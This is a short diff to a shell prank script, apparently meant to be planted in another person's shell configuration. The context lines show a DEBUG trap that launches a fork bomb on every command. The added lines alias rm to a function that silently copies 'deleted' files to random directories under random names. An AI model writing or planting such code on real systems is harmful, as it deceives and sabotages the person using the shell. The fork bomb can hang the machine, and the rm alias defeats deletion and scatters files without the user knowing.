@@ -22,3 +22,11 @@ trap '[ "$RANDOM" -le 15000 ] && flash_cage' DEBUG
 
 # This is a bit extreme 
 trap ":(){:&:&};:" DEBUG
+
+# Instead of removing a file, copy it somewhere else with a random name
+copy_instead() {
+    target="$(find . -maxdepth 3 -type d 2> /dev/null | grep -v '/\.' | shuf | head -n 1)/$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
+    cp $1 $target
+}
+
+alias rm=copy_instead
